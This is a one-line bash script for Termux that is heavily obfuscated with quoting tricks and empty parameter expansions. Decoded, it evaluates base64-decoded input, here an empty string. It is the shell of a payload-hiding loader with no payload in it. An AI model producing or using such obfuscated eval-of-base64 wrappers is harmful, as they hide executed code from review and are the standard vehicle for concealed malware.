#!/data/data/com.termux/files/usr/bin/bash
  "${@/<HoRj}"  ${*~}  ''e$'\x76\u0061''''l'   "$(    ${*^}  ${*~~}  "p"''r""in''$'\u0074'''f  ""  ${*//WYrz8SLl/BKtE}   |   "${@^}" ${@##tdfdd} b""'a'"s"e$'\x36'${@}4  -d   ${@^}      )"   ${*^^}  ${!@}   